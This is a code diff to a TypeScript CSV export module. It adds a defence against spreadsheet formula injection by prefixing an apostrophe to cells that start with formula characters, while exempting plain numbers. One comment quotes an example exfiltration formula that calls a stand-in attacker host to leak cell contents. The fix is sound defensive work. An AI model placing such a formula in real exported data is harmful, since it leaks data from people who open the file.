@@ -16,10 +16,11 @@
  * record separator `CRLF`; every reader that matters accepts a bare LF, and a field
  * that CONTAINS either is quoted, which is the part a reader cannot recover from.
  *
- * NOT done here: neutralising a leading `=`, `+`, `-` or `@`, which a spreadsheet
- * reads as a formula (`docs/BACKLOG.md` X1). That is a real hazard and a separate
- * decision, because the fix mutates the user's values on the way out; this file's
- * job is to write the value it was given, exactly and unambiguously.
+ * The one place this file is NOT faithful is `FORMULA_LEAD` below: a cell a
+ * spreadsheet would read as a formula is prefixed with an apostrophe (X1). An export
+ * that can execute on the machine of a reader who did not write the query is a worse
+ * default than one that carries a visible apostrophe, so it is unconditional — there
+ * is no setting and no checkbox, the same answer OWASP, GitHub and Google Sheets give.
  */
 
 import { jsonText } from "./json";
@@ -48,8 +49,37 @@ function renderValue(value: unknown): string {
   return String(value);
 }
 
+/**
+ * The first characters a spreadsheet reads as the start of a formula rather than as
+ * text. `\t` and `\r` are in the set because they are consumed before the character
+ * after them is judged, so they smuggle a formula past a check on position 0 —
+ * `\r` already forces quoting here, which says nothing about what Excel evaluates.
+ */
+const FORMULA_LEAD = /^[=+\-@\t\r]/;
+
+/**
+ * A number and nothing else — the leading `-` or `+` included.
+ *
+ * The exemption that keeps `-12.5` a number. It is exempt because the match is
+ * ANCHORED at both ends: a value made only of a sign, digits, one point and an
+ * exponent carries no operator, no call and no cell reference, so there is nothing
+ * for a spreadsheet to evaluate but the number itself. `-1+1` and `-1-2` do not
+ * match, and are neutralised. The text is tested rather than the JavaScript type
+ * because Postgres hands `numeric` back as a string.
+ */
+const PLAIN_NUMBER = /^[+-]?(\d+(\.\d*)?|\.\d+)([eE][+-]?\d+)?$/;
+
 function csvField(value: unknown): string {
   const text = renderValue(value);
+  // The one mutation in this file. `=HYPERLINK("http://attacker/"&A1)` is data in the
+  // database and a formula in Excel, LibreOffice and Google Sheets, and it runs when
+  // the file is opened by someone who did not write the query. Measured on LibreOffice
+  // 24.2: `=1+1` imports as a live formula, and with the apostrophe it imports as the
+  // string `'=1+1`. The apostrophe stays visible in the cell; that cost is paid on
+  // every value a spreadsheet would evaluate, and on no other.
+  if (FORMULA_LEAD.test(text) && !PLAIN_NUMBER.test(text)) {
+    return `"'${text.replace(/"/g, '""')}"`;
+  }
   return NEEDS_QUOTING.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
 }
 
